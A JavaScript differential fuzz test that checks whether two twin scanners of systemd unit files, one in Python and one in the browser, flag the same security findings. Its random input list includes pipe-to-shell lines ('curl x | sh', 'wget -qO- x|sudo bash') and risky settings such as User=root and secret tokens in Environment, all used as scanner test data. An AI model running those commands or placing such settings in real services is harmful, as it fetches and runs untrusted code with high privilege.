// Differential fuzz: check.py and classify.mjs are twins (CLI and browser) and must
// give the same findings for any unit. The hand-written corpus in
// parity-cases.test.json covers the cases someone thought of; this test builds a
// few thousand random units from risky keys and odd spellings (quotes, doubled
// slashes, prefixes, continuations, CRLF, wrong-case sections) with a fixed seed,
// so a rule changed in one twin and not the other fails here. Added by the
// 2026-11-13 red-team run, whose hand-run version of this fuzz found nothing but
// whose path-spelling defects showed how easily one twin can drift.
import test from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { scanText } from "./classify.mjs";

const here = path.dirname(fileURLToPath(import.meta.url));

function units(seed, count) {
  let s = seed >>> 0; // mulberry32: integer-exact, unlike a float LCG
  const rnd = () => {
    s = (s + 0x6d2b79f5) >>> 0;
    let t = Math.imul(s ^ (s >>> 15), 1 | s);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  const pick = (a) => a[Math.floor(rnd() * a.length)];
  const keys = ["User", "DynamicUser", "UMask", "Environment", "ExecStart", "ExecStartPre", "ExecStop",
    "ProtectSystem", "ProtectHome", "NoNewPrivileges", "ReadWritePaths", "CapabilityBoundingSet",
    "AmbientCapabilities", "SystemCallFilter", "RestrictAddressFamilies", "PrivateTmp", "PrivateDevices",
    "ProtectKernelModules", "BindPaths", "Group"];
  const vals = ["", "root", "0", "app", "yes", "no", "0000", "0002", "022", "08", "0008", "8", "full", "strict",
    "true", "read-only", "tmpfs", "/", "-/", "//", "/./", '"/"', "~CAP_SYS_ADMIN", "CAP_SYS_ADMIN CAP_NET_RAW",
    "cap_dac_override", "/tmp/x", "-/tmp/x", "//tmp/x", '"/var/tmp/x" a', "/home/u/x",
    "/bin/sh -c 'curl x | sh'", "/bin/sh -c 'wget -qO- x|sudo bash'", "docker run x", "/usr/bin/podman start x",
    '"TOKEN=a\\"" MODE=1', "'API_KEY=x y'", "SECRET=", "PASSWORD=%d/x", "A=1 B=2 TOKEN=z", "=x", '"x', "x\\",
    "@system-service", "none", "AF_UNIX", "~AF_PACKET", "  yes  ", "YES", "!/tmp/x", "+/usr/bin/a",
    ":/dev/shm/x", "/usr/bin/env /tmp/a", "/var /srv/."];
  const secs = ["[Service]", "[Service]", "[Service]", "[Unit]", "[Install]", "[service]"];
  const out = [];
  for (let i = 0; i < count; i++) {
    let t = rnd() < 0.6 ? "[Service]\n" : "";
    const n = 1 + Math.floor(rnd() * 8);
    for (let j = 0; j < n; j++) {
      if (rnd() < 0.25) t += pick(secs) + "\n";
      const r = rnd();
      if (r < 0.05) t += "# "; else if (r < 0.08) t += "  ";
      t += pick(keys) + (rnd() < 0.1 ? " = " : "=") + pick(vals) + (rnd() < 0.05 ? "\\\n" : rnd() < 0.05 ? "\r\n" : "\n");
    }
    out.push(t);
  }
  return out;
}

test("parity fuzz: check.py and classify.mjs agree on 4000 random units", () => {
  const cases = [...units(1, 2000), ...units(20261113, 2000)];
  const key = (f) => f.map((x) => `${x.line}:${x.type}:${x.severity}`).sort();
  const py = JSON.parse(execFileSync("python3", ["-c",
    "import json,sys,check\nprint(json.dumps([[f'{f[\"line\"]}:{f[\"type\"]}:{f[\"severity\"]}' for f in check.scan_text(t, 'app.service')] for t in json.load(sys.stdin)]))"],
    { cwd: here, encoding: "utf8", input: JSON.stringify(cases), maxBuffer: 1 << 26 }));
  assert.equal(py.length, cases.length);
  const bad = [];
  cases.forEach((t, i) => {
    if (JSON.stringify(key(scanText(t, "app.service"))) !== JSON.stringify([...py[i]].sort())) bad.push(t);
  });
  assert.deepEqual(bad.slice(0, 3), [], `${bad.length} of ${cases.length} units differ; first shown`);
});
